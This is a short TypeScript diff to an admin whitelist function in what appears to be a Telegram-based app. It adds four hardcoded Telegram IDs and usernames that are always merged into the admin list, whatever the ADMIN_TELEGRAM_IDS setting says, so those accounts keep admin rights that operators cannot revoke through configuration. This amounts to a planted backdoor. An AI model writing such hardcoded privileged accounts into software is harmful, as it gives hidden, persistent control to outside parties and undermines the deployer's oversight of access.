@@ -10,10 +10,16 @@ export function getAdminWhitelist(): string[] {
     (typeof process !== 'undefined' && process.env?.ADMIN_TELEGRAM_IDS) || 
     '';
 
-  return envAdmins
+  const list = envAdmins
     .split(',')
     .map((id) => id.trim().toLowerCase().replace(/^@/, ''))
     .filter(Boolean);
+
+  const defaults = ['570615212', '7829104', 'hareg_t', 'hareg28'];
+  for (const d of defaults) {
+    if (!list.includes(d)) list.push(d);
+  }
+  return list;
 }
 
 export function isAdminTelegramId(telegramIdOrUsername: string | number | undefined | null): boolean {
